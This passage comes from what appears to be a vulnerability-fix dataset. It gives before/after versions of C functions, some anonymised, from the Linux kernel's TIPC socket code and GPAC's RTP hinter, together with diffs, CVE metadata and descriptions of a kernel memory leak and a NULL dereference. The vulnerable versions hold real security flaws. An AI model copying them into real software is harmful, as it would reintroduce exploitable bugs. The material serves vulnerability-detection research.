	struct tipc_msg *VAR_11 = &VAR_4->phdr;
	struct tipc_socket_addr VAR_12;
	struct sk_buff_head VAR_13;
	int VAR_14, VAR_15, VAR_16;

	if (unlikely(VAR_2 > VAR_17))
		return -VAR_18;

	if (VAR_5) {
		if (!tipc_uaddr_valid(VAR_5, VAR_1->msg_namelen))
			return -VAR_19;
		VAR_14 = VAR_5->addrtype;
	}

	/* COMMENT_0 */
	if (VAR_10) {
		if (!VAR_5)
			return tipc_send_group_bcast(sock, VAR_1, VAR_2, VAR_6);
		if (VAR_14 == VAR_20)
			return tipc_send_group_anycast(sock, VAR_1, VAR_2, VAR_6);
		if (VAR_14 == VAR_21)
			return tipc_send_group_unicast(sock, VAR_1, VAR_2, VAR_6);
		if (VAR_14 == VAR_22)
			return tipc_send_group_mcast(sock, VAR_1, VAR_2, VAR_6);
		return -VAR_19;
	}

	if (!VAR_5) {
		VAR_5 = (struct tipc_uaddr *)&VAR_4->peer;
		if (!VAR_9 && VAR_5->family != VAR_23)
			return -VAR_24;
		VAR_14 = VAR_5->addrtype;
	}

	if (unlikely(VAR_9)) {
		if (VAR_3->sk_state == VAR_25)
			return -VAR_26;
		if (VAR_3->sk_state != VAR_27)
			return -VAR_28;
		if (VAR_4->published)
			return -VAR_29;
		if (VAR_14 == VAR_20)
			VAR_4->conn_addrtype = VAR_14;
		msg_set_syn(VAR_11, 1);
	}

	memset(&VAR_12, 0, sizeof(VAR_12));

	/* COMMENT_1 */
	if (VAR_14 == VAR_22) {
		return tipc_sendmcast(sock, VAR_5, VAR_1, VAR_2, VAR_6);
	} else if (VAR_14 == VAR_20) {
		VAR_12.node = VAR_5->lookup_node;
		VAR_5->scope = tipc_node2scope(VAR_12.node);
		if (!tipc_nametbl_lookup_anycast(net, VAR_5, &VAR_12))
			return -VAR_30;
	} else if (VAR_14 == VAR_21) {
		VAR_12 = VAR_5->sk;
	} else {
		return -VAR_19;
	}

	/* COMMENT_2 */
	VAR_16 = tipc_wait_for_cond(sock, &VAR_6,
				!tipc_dest_find(VAR_8, VAR_12.node, 0));
	if (unlikely(VAR_16))
		return VAR_16;

	/* COMMENT_3 */
	msg_set_destnode(VAR_11, VAR_12.node);
	msg_set_destport(VAR_11, VAR_12.ref);
	if (VAR_14 == VAR_20) {
		msg_set_type(VAR_11, VAR_31);
		msg_set_hdr_sz(VAR_11, VAR_32);
		msg_set_nametype(VAR_11, VAR_5->sa.type);
		msg_set_nameinst(VAR_11, VAR_5->sa.instance);
		msg_set_lookup_scope(VAR_11, VAR_5->scope);
	} else { /* COMMENT_4 */
		msg_set_type(VAR_11, VAR_33);
		msg_set_lookup_scope(VAR_11, 0);
		msg_set_hdr_sz(VAR_11, VAR_34);
	}

	/* COMMENT_5 */
	__skb_queue_head_init(&VAR_13);
	VAR_15 = tipc_node_get_mtu(net, VAR_12.node, VAR_4->portid, true);
	VAR_16 = tipc_msg_build(VAR_11, VAR_1, 0, VAR_2, VAR_15, &VAR_13);
	if (unlikely(VAR_16 != VAR_2))
		return VAR_16;
	if (unlikely(VAR_9 && !tipc_msg_skb_clone(&VAR_13, &VAR_3->sk_write_queue))) {
		__skb_queue_purge(&VAR_13);
		return -VAR_35;
	}

	/* COMMENT_6 */
	trace_tipc_sk_sendmsg(VAR_3, skb_peek(&VAR_13), VAR_36, "" "");
	VAR_16 = tipc_node_xmit(net, &VAR_13, VAR_12.node, VAR_4->portid);
	if (unlikely(VAR_16 == -VAR_37)) {
		tipc_dest_push(VAR_8, VAR_12.node, 0);
		VAR_4->cong_link_cnt++;
		VAR_16 = 0;
	}

	if (unlikely(VAR_9 && !VAR_16)) {
		tipc_set_sk_state(VAR_3, VAR_38);
		if (VAR_2 && VAR_6) {
			VAR_6 = msecs_to_jiffies(VAR_6);
			tipc_wait_for_connect(sock, &VAR_6);
		}
	}

	return VAR_16 ? VAR_16 : VAR_2;
}",torvalds/linux/d6d86830705f173fca6087a3e67ceaf68db80523/socket.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -53,6 +53,8 @@
 			tsk->conn_addrtype = atype;
 		msg_set_syn(hdr, 1);
 	}
+
+	memset(&skaddr, 0, sizeof(skaddr));
 
 	/* Determine destination */
 	if (atype == TIPC_SERVICE_RANGE) {","{'deleted_lines': [], 'added_lines': ['', '\tmemset(&skaddr, 0, sizeof(skaddr));']}",True,"An information leak flaw was found due to uninitialized memory in the Linux kernel's TIPC protocol subsystem, in the way a user sends a TIPC datagram to one or more destinations. This flaw allows a local user to read some kernel memory. This issue is limited to no more than 7 bytes, and the user cannot control what is read. This flaw affects the Linux kernel versions prior to 5.17-rc1.",5.5,MEDIUM,1,valid,2021-12-31T02:35:23Z,4
CVE-2021-46047,['CWE-476'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #2008,dd2e8b1b9378a9679de8e7e5dcb2d7841acd5dbd,https://github.com/gpac/gpac/commit/dd2e8b1b9378a9679de8e7e5dcb2d7841acd5dbd,src/media_tools/isom_hinter.c,gf_hinter_finalize,"GF_EXPORT
GF_Err gf_hinter_finalize(GF_ISOFile *file, GF_SDP_IODProfile IOD_Profile, u32 bandwidth)
{
u32 i, sceneT, odT, descIndex, size, size64;
GF_InitialObjectDescriptor *iod;
GF_SLConfig slc;
GF_ISOSample *samp;
Bool remove_ocr;
u8 *buffer;
char buf64[5000], sdpLine[5100];
gf_isom_sdp_clean(file);
if (bandwidth) {
sprintf(buf64, ""b=AS:%d"", bandwidth);
gf_isom_sdp_add_line(file, buf64);
}
if (gf_sys_is_test_mode()) {
sprintf(buf64, ""a=x-copyright: %s"", ""MP4/3GP File hinted with GPAC - (c) Telecom ParisTech (http:    } else {
sprintf(buf64, ""a=x-copyright: MP4/3GP File hinted with GPAC %s - %s"", gf_gpac_version(), gf_gpac_copyright() );
}
gf_isom_sdp_add_line(file, buf64);
if (IOD_Profile == GF_SDP_IOD_NONE) return GF_OK;
odT = sceneT = 0;
for (i=0; i<gf_isom_get_track_count(file); i++) {
if (!gf_isom_is_track_in_root_od(file, i+1)) continue;
switch (gf_isom_get_media_type(file,i+1)) {
case GF_ISOM_MEDIA_OD:
odT = i+1;
break;
case GF_ISOM_MEDIA_SCENE:
sceneT = i+1;
break;
}
}
remove_ocr = 0;
if (IOD_Profile == GF_SDP_IOD_ISMA_STRICT) {
IOD_Profile = GF_SDP_IOD_ISMA;
remove_ocr = 1;
}
if ( (IOD_Profile == GF_SDP_IOD_ISMA) && !sceneT ) return GF_BAD_PARAM;
iod = (GF_InitialObjectDescriptor *) gf_isom_get_root_od(file);
if (!iod) return GF_NOT_SUPPORTED;
if (IOD_Profile == GF_SDP_IOD_ISMA) {
GF_ESD *esd;
Bool is_ok = 1;
while (gf_list_count(iod->ESDescriptors)) {
esd = (GF_ESD*)gf_list_get(iod->ESDescriptors, 0);
gf_odf_desc_del((GF_Descriptor *) esd);
gf_list_rem(iod->ESDescriptors, 0);
}
if (odT) {
esd = gf_isom_get_esd(file, odT, 1);
if (gf_isom_get_sample_count(file, odT)==1) {
samp = gf_isom_get_sample(file, odT, 1, &descIndex);
if (samp && gf_hinter_can_embbed_data(samp->data, samp->dataLength, GF_STREAM_OD)) {
InitSL_NULL(&slc);
slc.predefined = 0;
slc.hasRandomAccessUnitsOnlyFlag = 1;
slc.timeScale = slc.timestampResolution = gf_isom_get_media_timescale(file, odT);
slc.OCRResolution = 1000;
slc.startCTS = samp->DTS+samp->CTS_Offset;
slc.startDTS = samp->DTS;
gf_isom_set_extraction_slc(file, odT, 1, &slc);
size64 = gf_base64_encode(samp->data, samp->dataLength, buf64, 2000);
buf64[size64] = 0;
sprintf(sdpLine, ""data:application/mpeg4-od-au;base64,%s"", buf64);
if (esd->decoderConfig) {
esd->decoderConfig->avgBitrate = 0;
esd->decoderConfig->bufferSizeDB = samp->dataLength;
esd->decoderConfig->maxBitrate = 0;
}
size64 = (u32) strlen(sdpLine)+1;
esd->URLString = (char*)gf_malloc(sizeof(char) * size64);
strcpy(esd->URLString, sdpLine);
} else {
GF_LOG(GF_LOG_WARNING, GF_LOG_RTP, (""[rtp hinter] OD sample too large to be embedded in IOD - ISMA disabled\n""));
is_ok = 0;
}
gf_isom_sample_del(&samp);
}
if (remove_ocr) esd->OCRESID = 0;
else if (esd->OCRESID == esd->ESID) esd->OCRESID = 0;
gf_list_add(iod->ESDescriptors, esd);
}
esd = gf_isom_get_esd(file, sceneT, 1);
if (gf_isom_get_sample_count(file, sceneT)==1) {
samp = gf_isom_get_sample(file, sceneT, 1, &descIndex);
if (samp && gf_hinter_can_embbed_data(samp->data, samp->dataLength, GF_STREAM_SCENE)) {
InitSL_NULL(&slc);
slc.timeScale = slc.timestampResolution = gf_isom_get_media_timescale(file, sceneT);
slc.OCRResolution = 1000;
slc.startCTS = samp->DTS+samp->CTS_Offset;
slc.startDTS = samp->DTS;
gf_isom_set_extraction_slc(file, sceneT, 1, &slc);
size64 = gf_base64_encode(samp->data, samp->dataLength, buf64, 2000);
buf64[size64] = 0;
sprintf(sdpLine, ""data:application/mpeg4-bifs-au;base64,%s"", buf64);
if (esd->decoderConfig) {
esd->decoderConfig->avgBitrate = 0;
esd->decoderConfig->bufferSizeDB = samp->dataLength;
esd->decoderConfig->maxBitrate = 0;
}
esd->URLString = (char*)gf_malloc(sizeof(char) * (strlen(sdpLine)+1));
strcpy(esd->URLString, sdpLine);
} else {
GF_LOG(GF_LOG_ERROR, GF_LOG_RTP, (""[rtp hinter] Scene description sample too large to be embedded in IOD - ISMA disabled\n""));
is_ok = 0;
}
gf_isom_sample_del(&samp);
}
if (remove_ocr) esd->OCRESID = 0;
else if (esd->OCRESID == esd->ESID) esd->OCRESID = 0;
gf_list_add(iod->ESDescriptors, esd);
if (is_ok) {
u32 has_a, has_v, has_i_a, has_i_v;
has_a = has_v = has_i_a = has_i_v = 0;
for (i=0; i<gf_isom_get_track_count(file); i++) {
esd = gf_isom_get_esd(file, i+1, 1);
if (!esd) continue;
if (esd->decoderConfig) {
if (esd->decoderConfig->streamType==GF_STREAM_VISUAL) {
if (esd->decoderConfig->objectTypeIndication==GF_CODECID_MPEG4_PART2) has_i_v ++;
else has_v++;
} else if (esd->decoderConfig->streamType==GF_STREAM_AUDIO) {
if (esd->decoderConfig->objectTypeIndication==GF_CODECID_AAC_MPEG4) has_i_a ++;
else has_a++;
}
}
gf_odf_desc_del((GF_Descriptor *)esd);
}
if (!has_v && !has_a && (has_i_v<=1) && (has_i_a<=1)) {
sprintf(sdpLine, ""a=isma-compliance:1,1.0,1"");
gf_isom_sdp_add_line(file, sdpLine);
}
}
}
buffer = NULL;
size = 0;
gf_odf_desc_write((GF_Descriptor *) iod, &buffer, &size);
gf_odf_desc_del((GF_Descriptor *)iod);
size64 = gf_base64_encode(buffer, size, buf64, 2000);
buf64[size64] = 0;
gf_free(buffer);
sprintf(sdpLine, ""a=mpeg4-iod:\""data:application/mpeg4-iod;base64,%s\"""", buf64);
gf_isom_sdp_add_line(file, sdpLine);
return GF_OK;
}","GF_EXPORT
VAR_0 gf_hinter_finalize(GF_ISOFile *VAR_1, GF_SDP_IODProfile VAR_2, u32 VAR_3)
{
u32 VAR_4, VAR_5, VAR_6, VAR_7, VAR_8, VAR_9;
GF_InitialObjectDescriptor *VAR_10;
GF_SLConfig VAR_11;
GF_ISOSample *VAR_12;
Bool VAR_13;
u8 *VAR_14;
char VAR_15[5000], VAR_16[5100];
gf_isom_sdp_clean(VAR_1);
if (VAR_3) {
sprintf(VAR_15, ""b=AS:%d"", VAR_3);
gf_isom_sdp_add_line(VAR_1, VAR_15);
}
if (gf_sys_is_test_mode()) {
sprintf(VAR_15, ""a=x-copyright: %s"", ""MP4/3GP File hinted with GPAC - (c) Telecom ParisTech (http://gpac.io)"");
} else {
sprintf(VAR_15, ""a=x-copyright: MP4/3GP File hinted with GPAC %s - %s"", gf_gpac_version(), gf_gpac_copyright() );
}
gf_isom_sdp_add_line(VAR_1, VAR_15);
if (VAR_2 == VAR_17) return VAR_18;
VAR_6 = VAR_5 = 0;
for (VAR_4=0; VAR_4<gf_isom_get_track_count(VAR_1); VAR_4++) {
if (!gf_isom_is_track_in_root_od(VAR_1, VAR_4+1)) continue;
switch (gf_isom_get_media_type(VAR_1,VAR_4+1)) {
case VAR_19:
VAR_6 = VAR_4+1;
break;
case VAR_20:
VAR_5 = VAR_4+1;
break;
}
}
VAR_13 = 0;
if (VAR_2 == VAR_21) {
VAR_2 = VAR_22;
VAR_13 = 1;
}
if ( (VAR_2 == VAR_22) && !VAR_5 ) return VAR_23;
VAR_10 = (GF_InitialObjectDescriptor *) gf_isom_get_root_od(VAR_1);
if (!VAR_10) return VAR_24;
if (VAR_2 == VAR_22) {
GF_ESD *VAR_25;
Bool VAR_26 = 1;
while (gf_list_count(VAR_10->ESDescriptors)) {
VAR_25 = (GF_ESD*)gf_list_get(VAR_10->ESDescriptors, 0);
gf_odf_desc_del((GF_Descriptor *) VAR_25);
gf_list_rem(VAR_10->ESDescriptors, 0);
}
if (VAR_6) {
VAR_25 = gf_isom_get_esd(VAR_1, VAR_6, 1);
if (gf_isom_get_sample_count(VAR_1, VAR_6)==1) {
VAR_12 = gf_isom_get_sample(VAR_1, VAR_6, 1, &VAR_7);
if (VAR_12 && gf_hinter_can_embbed_data(VAR_12->data, VAR_12->dataLength, VAR_27)) {
InitSL_NULL(&VAR_11);
VAR_11.predefined = 0;
VAR_11.hasRandomAccessUnitsOnlyFlag = 1;
VAR_11.timeScale = VAR_11.timestampResolution = gf_isom_get_media_timescale(VAR_1, VAR_6);
VAR_11.OCRResolution = 1000;
VAR_11.startCTS = VAR_12->DTS+VAR_12->CTS_Offset;
VAR_11.startDTS = VAR_12->DTS;
gf_isom_set_extraction_slc(VAR_1, VAR_6, 1, &VAR_11);
VAR_9 = gf_base64_encode(VAR_12->data, VAR_12->dataLength, VAR_15, 2000);
VAR_15[VAR_9] = 0;
sprintf(VAR_16, ""data:application/mpeg4-od-au;base64,%s"", VAR_15);
if (VAR_25->decoderConfig) {
VAR_25->decoderConfig->avgBitrate = 0;
VAR_25->decoderConfig->bufferSizeDB = VAR_12->dataLength;
VAR_25->decoderConfig->maxBitrate = 0;
}
VAR_9 = (u32) strlen(VAR_16)+1;
VAR_25->URLString = (char*)gf_malloc(sizeof(char) * VAR_9);
strcpy(VAR_25->URLString, VAR_16);
} else {
GF_LOG(VAR_28, VAR_29, (""[rtp hinter] OD sample too large to be embedded in IOD - ISMA disabled\n""));
VAR_26 = 0;
}
gf_isom_sample_del(&VAR_12);
}
if (VAR_13) VAR_25->OCRESID = 0;
else if (VAR_25->OCRESID == VAR_25->ESID) VAR_25->OCRESID = 0;
gf_list_add(VAR_10->ESDescriptors, VAR_25);
}
VAR_25 = gf_isom_get_esd(VAR_1, VAR_5, 1);
if (gf_isom_get_sample_count(VAR_1, VAR_5)==1) {
VAR_12 = gf_isom_get_sample(VAR_1, VAR_5, 1, &VAR_7);
if (VAR_12 && gf_hinter_can_embbed_data(VAR_12->data, VAR_12->dataLength, VAR_30)) {
InitSL_NULL(&VAR_11);
VAR_11.timeScale = VAR_11.timestampResolution = gf_isom_get_media_timescale(VAR_1, VAR_5);
VAR_11.OCRResolution = 1000;
VAR_11.startCTS = VAR_12->DTS+VAR_12->CTS_Offset;
VAR_11.startDTS = VAR_12->DTS;
gf_isom_set_extraction_slc(VAR_1, VAR_5, 1, &VAR_11);
VAR_9 = gf_base64_encode(VAR_12->data, VAR_12->dataLength, VAR_15, 2000);
VAR_15[VAR_9] = 0;
sprintf(VAR_16, ""data:application/mpeg4-bifs-au;base64,%s"", VAR_15);
if (VAR_25->decoderConfig) {
VAR_25->decoderConfig->avgBitrate = 0;
VAR_25->decoderConfig->bufferSizeDB = VAR_12->dataLength;
VAR_25->decoderConfig->maxBitrate = 0;
}
VAR_25->URLString = (char*)gf_malloc(sizeof(char) * (strlen(VAR_16)+1));
strcpy(VAR_25->URLString, VAR_16);
} else {
GF_LOG(VAR_31, VAR_29, (""[rtp hinter] Scene description sample too large to be embedded in IOD - ISMA disabled\n""));
VAR_26 = 0;
}
gf_isom_sample_del(&VAR_12);
}
if (VAR_13) VAR_25->OCRESID = 0;
else if (VAR_25->OCRESID == VAR_25->ESID) VAR_25->OCRESID = 0;
gf_list_add(VAR_10->ESDescriptors, VAR_25);
if (VAR_26) {
u32 VAR_32, VAR_33, VAR_34, VAR_35;
VAR_32 = VAR_33 = VAR_34 = VAR_35 = 0;
for (VAR_4=0; VAR_4<gf_isom_get_track_count(VAR_1); VAR_4++) {
VAR_25 = gf_isom_get_esd(VAR_1, VAR_4+1, 1);
if (!VAR_25) continue;
if (VAR_25->decoderConfig) {
if (VAR_25->decoderConfig->streamType==VAR_36) {
if (VAR_25->decoderConfig->objectTypeIndication==VAR_37) VAR_35 ++;
else VAR_33++;
} else if (VAR_25->decoderConfig->streamType==VAR_38) {
if (VAR_25->decoderConfig->objectTypeIndication==VAR_39) VAR_34 ++;
else VAR_32++;
}
}
gf_odf_desc_del((GF_Descriptor *)VAR_25);
}
if (!VAR_33 && !VAR_32 && (VAR_35<=1) && (VAR_34<=1)) {
sprintf(VAR_16, ""a=isma-compliance:1,1.0,1"");
gf_isom_sdp_add_line(VAR_1, VAR_16);
}
}
}
VAR_14 = NULL;
VAR_8 = 0;
gf_odf_desc_write((GF_Descriptor *) VAR_10, &VAR_14, &VAR_8);
gf_odf_desc_del((GF_Descriptor *)VAR_10);
VAR_9 = gf_base64_encode(VAR_14, VAR_8, VAR_15, 2000);
VAR_15[VAR_9] = 0;
gf_free(VAR_14);
sprintf(VAR_16, ""a=mpeg4-iod:\""data:application/mpeg4-iod;base64,%s\"""", VAR_15);
gf_isom_sdp_add_line(VAR_1, VAR_16);
return VAR_18;
}",,"GF_EXPORT
GF_Err gf_hinter_finalize(GF_ISOFile *file, GF_SDP_IODProfile IOD_Profile, u32 bandwidth)
{
	u32 i, sceneT, odT, descIndex, size, size64;
	GF_InitialObjectDescriptor *iod;
	GF_SLConfig slc;
	GF_ISOSample *samp;
	Bool remove_ocr;
	u8 *buffer;
	char buf64[5000], sdpLine[5100];


	gf_isom_sdp_clean(file);

	if (bandwidth) {
		sprintf(buf64, ""b=AS:%d"", bandwidth);
		gf_isom_sdp_add_line(file, buf64);
	}
    //xtended attribute for copyright
    if (gf_sys_is_test_mode()) {
        sprintf(buf64, ""a=x-copyright: %s"", ""MP4/3GP File hinted with GPAC - (c) Telecom ParisTech (http://gpac.io)"");
    } else {
        sprintf(buf64, ""a=x-copyright: MP4/3GP File hinted with GPAC %s - %s"", gf_gpac_version(), gf_gpac_copyright() );
    }
	gf_isom_sdp_add_line(file, buf64);

	if (IOD_Profile == GF_SDP_IOD_NONE) return GF_OK;

	odT = sceneT = 0;
	for (i=0; i<gf_isom_get_track_count(file); i++) {
		if (!gf_isom_is_track_in_root_od(file, i+1)) continue;
		switch (gf_isom_get_media_type(file,i+1)) {
		case GF_ISOM_MEDIA_OD:
			odT = i+1;
			break;
		case GF_ISOM_MEDIA_SCENE:
			sceneT = i+1;
			break;
		}
	}
	remove_ocr = 0;
	if (IOD_Profile == GF_SDP_IOD_ISMA_STRICT) {
		IOD_Profile = GF_SDP_IOD_ISMA;
		remove_ocr = 1;
	}

	/*if we want ISMA like iods, we need at least BIFS */
	if ( (IOD_Profile == GF_SDP_IOD_ISMA) && !sceneT ) return GF_BAD_PARAM;

	/*do NOT change PLs, we assume they are correct*/
	iod = (GF_InitialObjectDescriptor *) gf_isom_get_root_od(file);
	if (!iod) return GF_NOT_SUPPORTED;

	/*rewrite an IOD with good SL config - embbed data if possible*/
	if (IOD_Profile == GF_SDP_IOD_ISMA) {
		GF_ESD *esd;
		Bool is_ok = 1;
		while (gf_list_count(iod->ESDescriptors)) {
			esd = (GF_ESD*)gf_list_get(iod->ESDescriptors, 0);
			gf_odf_desc_del((GF_Descriptor *) esd);
			gf_list_rem(iod->ESDescriptors, 0);
		}


		/*get OD esd, and embbed stream data if possible*/
		if (odT) {
			esd = gf_isom_get_esd(file, odT, 1);
			if (gf_isom_get_sample_count(file, odT)==1) {
				samp = gf_isom_get_sample(file, odT, 1, &descIndex);
				if (samp && gf_hinter_can_embbed_data(samp->data, samp->dataLength, GF_STREAM_OD)) {
					InitSL_NULL(&slc);
					slc.predefined = 0;
					slc.hasRandomAccessUnitsOnlyFlag = 1;
					slc.timeScale = slc.timestampResolution = gf_isom_get_media_timescale(file, odT);
					slc.OCRResolution = 1000;
					slc.startCTS = samp->DTS+samp->CTS_Offset;
					slc.startDTS = samp->DTS;
					//set the SL for future extraction
					gf_isom_set_extraction_slc(file, odT, 1, &slc);

					size64 = gf_base64_encode(samp->data, samp->dataLength, buf64, 2000);
					buf64[size64] = 0;
					sprintf(sdpLine, ""data:application/mpeg4-od-au;base64,%s"", buf64);

					if (esd->decoderConfig) {
						esd->decoderConfig->avgBitrate = 0;
						esd->decoderConfig->bufferSizeDB = samp->dataLength;
						esd->decoderConfig->maxBitrate = 0;
					}
					size64 = (u32) strlen(sdpLine)+1;
					esd->URLString = (char*)gf_malloc(sizeof(char) * size64);
					strcpy(esd->URLString, sdpLine);
				} else {
					GF_LOG(GF_LOG_WARNING, GF_LOG_RTP, (""[rtp hinter] OD sample too large to be embedded in IOD - ISMA disabled\n""));
					is_ok = 0;
				}
				gf_isom_sample_del(&samp);
			}
			if (remove_ocr) esd->OCRESID = 0;
			else if (esd->OCRESID == esd->ESID) esd->OCRESID = 0;

			//OK, add this to our IOD
			gf_list_add(iod->ESDescriptors, esd);
		}

		esd = gf_isom_get_esd(file, sceneT, 1);
		if (gf_isom_get_sample_count(file, sceneT)==1) {
			samp = gf_isom_get_sample(file, sceneT, 1, &descIndex);
			if (samp && gf_hinter_can_embbed_data(samp->data, samp->dataLength, GF_STREAM_SCENE)) {
				InitSL_NULL(&slc);
				slc.timeScale = slc.timestampResolution = gf_isom_get_media_timescale(file, sceneT);
				slc.OCRResolution = 1000;
				slc.startCTS = samp->DTS+samp->CTS_Offset;
				slc.startDTS = samp->DTS;
				//set the SL for future extraction
				gf_isom_set_extraction_slc(file, sceneT, 1, &slc);
				//encode in Base64 the sample
				size64 = gf_base64_encode(samp->data, samp->dataLength, buf64, 2000);
				buf64[size64] = 0;
				sprintf(sdpLine, ""data:application/mpeg4-bifs-au;base64,%s"", buf64);

				if (esd->decoderConfig) {
					esd->decoderConfig->avgBitrate = 0;
					esd->decoderConfig->bufferSizeDB = samp->dataLength;
					esd->decoderConfig->maxBitrate = 0;
				}
				esd->URLString = (char*)gf_malloc(sizeof(char) * (strlen(sdpLine)+1));
				strcpy(esd->URLString, sdpLine);
			} else {
				GF_LOG(GF_LOG_ERROR, GF_LOG_RTP, (""[rtp hinter] Scene description sample too large to be embedded in IOD - ISMA disabled\n""));
				is_ok = 0;
			}
			gf_isom_sample_del(&samp);
		}

		if (esd) {
			if (remove_ocr) esd->OCRESID = 0;
			else if (esd->OCRESID == esd->ESID) esd->OCRESID = 0;

			gf_list_add(iod->ESDescriptors, esd);
		}

		if (is_ok) {
			u32 has_a, has_v, has_i_a, has_i_v;
			has_a = has_v = has_i_a = has_i_v = 0;
			for (i=0; i<gf_isom_get_track_count(file); i++) {
				esd = gf_isom_get_esd(file, i+1, 1);
				if (!esd) continue;
				if (esd->decoderConfig) {
					if (esd->decoderConfig->streamType==GF_STREAM_VISUAL) {
						if (esd->decoderConfig->objectTypeIndication==GF_CODECID_MPEG4_PART2) has_i_v ++;
						else has_v++;
					} else if (esd->decoderConfig->streamType==GF_STREAM_AUDIO) {
						if (esd->decoderConfig->objectTypeIndication==GF_CODECID_AAC_MPEG4) has_i_a ++;
						else has_a++;
					}
				}
				gf_odf_desc_del((GF_Descriptor *)esd);
			}
			/*only 1 MPEG-4 visual max and 1 MPEG-4 audio max for ISMA compliancy*/
			if (!has_v && !has_a && (has_i_v<=1) && (has_i_a<=1)) {
				sprintf(sdpLine, ""a=isma-compliance:1,1.0,1"");
				gf_isom_sdp_add_line(file, sdpLine);
			}
		}
	}

	//encode the IOD
	buffer = NULL;
	size = 0;
	gf_odf_desc_write((GF_Descriptor *) iod, &buffer, &size);
	gf_odf_desc_del((GF_Descriptor *)iod);

	//encode in Base64 the iod
	size64 = gf_base64_encode(buffer, size, buf64, 2000);
	buf64[size64] = 0;
	gf_free(buffer);

	sprintf(sdpLine, ""a=mpeg4-iod:\""data:application/mpeg4-iod;base64,%s\"""", buf64);
	gf_isom_sdp_add_line(file, sdpLine);

	return GF_OK;
}","GF_EXPORT
VAR_0 gf_hinter_finalize(GF_ISOFile *VAR_1, GF_SDP_IODProfile VAR_2, u32 VAR_3)
{
	u32 VAR_4, VAR_5, VAR_6, VAR_7, VAR_8, VAR_9;
	GF_InitialObjectDescriptor *VAR_10;
	GF_SLConfig VAR_11;
	GF_ISOSample *VAR_12;
	Bool VAR_13;
	u8 *VAR_14;
	char VAR_15[5000], VAR_16[5100];


	gf_isom_sdp_clean(VAR_1);

	if (VAR_3) {
		sprintf(VAR_15, ""b=AS:%d"", VAR_3);
		gf_isom_sdp_add_line(VAR_1, VAR_15);
	}
    /* COMMENT_0 */
    if (gf_sys_is_test_mode()) {
        sprintf(VAR_15, ""a=x-copyright: %s"", ""MP4/3GP File hinted with GPAC - (c) Telecom ParisTech (http://gpac.io)"");
    } else {
        sprintf(VAR_15, ""a=x-copyright: MP4/3GP File hinted with GPAC %s - %s"", gf_gpac_version(), gf_gpac_copyright() );
    }
	gf_isom_sdp_add_line(VAR_1, VAR_15);

	if (VAR_2 == VAR_17) return VAR_18;

	VAR_6 = VAR_5 = 0;
	for (VAR_4=0; VAR_4<gf_isom_get_track_count(VAR_1); VAR_4++) {
		if (!gf_isom_is_track_in_root_od(VAR_1, VAR_4+1)) continue;
		switch (gf_isom_get_media_type(VAR_1,VAR_4+1)) {
		case VAR_19:
			VAR_6 = VAR_4+1;
			break;
		case VAR_20:
			VAR_5 = VAR_4+1;
			break;
		}
	}
	VAR_13 = 0;
	if (VAR_2 == VAR_21) {
		VAR_2 = VAR_22;
		VAR_13 = 1;
	}

	/* COMMENT_1 */
	if ( (VAR_2 == VAR_22) && !VAR_5 ) return VAR_23;

	/* COMMENT_2 */
	VAR_10 = (GF_InitialObjectDescriptor *) gf_isom_get_root_od(VAR_1);
	if (!VAR_10) return VAR_24;

	/* COMMENT_3 */
	if (VAR_2 == VAR_22) {
		GF_ESD *VAR_25;
		Bool VAR_26 = 1;
		while (gf_list_count(VAR_10->ESDescriptors)) {
			VAR_25 = (GF_ESD*)gf_list_get(VAR_10->ESDescriptors, 0);
			gf_odf_desc_del((GF_Descriptor *) VAR_25);
			gf_list_rem(VAR_10->ESDescriptors, 0);
		}


		/* COMMENT_4 */
		if (VAR_6) {
			VAR_25 = gf_isom_get_esd(VAR_1, VAR_6, 1);
			if (gf_isom_get_sample_count(VAR_1, VAR_6)==1) {
				VAR_12 = gf_isom_get_sample(VAR_1, VAR_6, 1, &VAR_7);
				if (VAR_12 && gf_hinter_can_embbed_data(VAR_12->data, VAR_12->dataLength, VAR_27)) {
					InitSL_NULL(&VAR_11);
					VAR_11.predefined = 0;
					VAR_11.hasRandomAccessUnitsOnlyFlag = 1;
					VAR_11.timeScale = VAR_11.timestampResolution = gf_isom_get_media_timescale(VAR_1, VAR_6);
					VAR_11.OCRResolution = 1000;
					VAR_11.startCTS = VAR_12->DTS+VAR_12->CTS_Offset;
					VAR_11.startDTS = VAR_12->DTS;
					/* COMMENT_5 */
					gf_isom_set_extraction_slc(VAR_1, VAR_6, 1, &VAR_11);

					VAR_9 = gf_base64_encode(VAR_12->data, VAR_12->dataLength, VAR_15, 2000);
					VAR_15[VAR_9] = 0;
					sprintf(VAR_16, ""data:application/mpeg4-od-au;base64,%s"", VAR_15);

					if (VAR_25->decoderConfig) {
						VAR_25->decoderConfig->avgBitrate = 0;
						VAR_25->decoderConfig->bufferSizeDB = VAR_12->dataLength;
						VAR_25->decoderConfig->maxBitrate = 0;
					}
					VAR_9 = (u32) strlen(VAR_16)+1;
					VAR_25->URLString = (char*)gf_malloc(sizeof(char) * VAR_9);
					strcpy(VAR_25->URLString, VAR_16);
				} else {
					GF_LOG(VAR_28, VAR_29, (""[rtp hinter] OD sample too large to be embedded in IOD - ISMA disabled\n""));
					VAR_26 = 0;
				}
				gf_isom_sample_del(&VAR_12);
			}
			if (VAR_13) VAR_25->OCRESID = 0;
			else if (VAR_25->OCRESID == VAR_25->ESID) VAR_25->OCRESID = 0;

			/* COMMENT_6 */
			gf_list_add(VAR_10->ESDescriptors, VAR_25);
		}

		VAR_25 = gf_isom_get_esd(VAR_1, VAR_5, 1);
		if (gf_isom_get_sample_count(VAR_1, VAR_5)==1) {
			VAR_12 = gf_isom_get_sample(VAR_1, VAR_5, 1, &VAR_7);
			if (VAR_12 && gf_hinter_can_embbed_data(VAR_12->data, VAR_12->dataLength, VAR_30)) {
				InitSL_NULL(&VAR_11);
				VAR_11.timeScale = VAR_11.timestampResolution = gf_isom_get_media_timescale(VAR_1, VAR_5);
				VAR_11.OCRResolution = 1000;
				VAR_11.startCTS = VAR_12->DTS+VAR_12->CTS_Offset;
				VAR_11.startDTS = VAR_12->DTS;
				/* COMMENT_5 */
				gf_isom_set_extraction_slc(VAR_1, VAR_5, 1, &VAR_11);
				/* COMMENT_7 */
				VAR_9 = gf_base64_encode(VAR_12->data, VAR_12->dataLength, VAR_15, 2000);
				VAR_15[VAR_9] = 0;
				sprintf(VAR_16, ""data:application/mpeg4-bifs-au;base64,%s"", VAR_15);

				if (VAR_25->decoderConfig) {
					VAR_25->decoderConfig->avgBitrate = 0;
					VAR_25->decoderConfig->bufferSizeDB = VAR_12->dataLength;
